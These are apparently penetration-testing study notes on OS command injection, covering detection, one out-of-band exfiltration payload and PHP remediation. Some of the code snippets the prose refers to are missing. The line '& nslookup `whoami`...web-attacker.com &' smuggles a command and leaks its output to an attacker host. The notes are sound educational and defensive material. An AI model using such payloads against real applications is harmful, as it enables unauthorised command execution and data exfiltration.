---
title: Command injection
source_url: https://notes.incendium.rocks/pentesting-notes/web/injection/command-injection
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---
Command injection is the abuse of an application's behaviour to execute commands on the operating system, using the same privileges that the application on a device is running with.

A command injection vulnerability is also known as a "Remote Code Execution" (RCE) because an attacker can trick the application into executing a series of payloads that they provide, without direct access to the machine itself (i.e. an interactive shell).

***

### Discovering Command Injection

This vulnerability exists because applications often use functions in programming languages such as PHP, Python and NodeJS to pass data to and to make system calls on the machine’s operating system. For example, taking input from a field and searching for an entry into a file. Take this code snippet below as an example:

Rather than using `grep`to search for an entry in `songtitle.txt`, they could ask the application to read data from a more sensitive file.

Abusing applications in this way can be possible no matter the programming language the application uses. As long as the application processes and executes it, it can result in command injection. For example, this code snippet below is an application written in Python.

***

### Exploiting Command Injection

Applications that use user input to populate system commands with data can often be combined in unintended behaviour. **For example, the shell operators `;`, `&` and `&&` will combine two (or more) system commands and execute them both**.

Command Injection can be detected in mostly one of two ways:

1. Blind command injection
2. Verbose command injection

Detecting Blind Command Injection

Blind command injection is when command injection occurs; however, there is no output visible, so it is not immediately noticeable. For example, a command is executed, but the web application outputs no message.

* For this type of command injection, we will need to use payloads that will cause some time delay. For example, the `ping`and `sleep`commands are significant payloads to test with. Using `ping`as an example, the application will hang for x seconds in relation to how many *pings* you have specified.
* Another method of detecting blind command injection is by forcing some output. This can be done by using redirection operators such as `>`
* The `curl` command is a great way to test for command injection

Detecting Verbose Command Injection

Detecting command injection this way is arguably the easiest method of the two. Verbose command injection is when the application gives you feedback or output as to what is happening or being executed.

For example, the output of commands such as `ping` or `whoami` is directly displayed on the web application.

## Blind command injection with out-of-band data exfiltration

```sh
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

***

### Remediating Command Injection

Command injection can be prevented in a variety of ways. Everything from minimal use of potentially dangerous functions or libraries in a programming language to filtering input without relying on a user’s input.

In PHP, many functions interact with the operating system to execute commands via shell; these include:

```php
Exec();
Passthru();
System();
```

Take this snippet below as an example. Here, the application will only accept and process numbers that are inputted into the form. This means that any commands such as `whoami` will not be processed.

1. The application will only accept a specific pattern of characters (the digits 0-9)
2. The application will then only proceed to execute this data which is all numerical.

Sanitising any input from a user that an application uses is a great way to prevent command injection. This is a process of specifying the formats or types of data that a user can submit. For example, an input field that only accepts numerical data or removes any special characters such as `>` ,  `&`and `/`.

In the snippet below, the `filter_input` [PHP function](https://www.php.net/manual/en/function.filter-input.php) is used to check whether or not any data submitted via an input form is a number or not. If it is not a number, it must be invalid input.

### Links

<https://github.com/payloadbox/command-injection-payload-list>
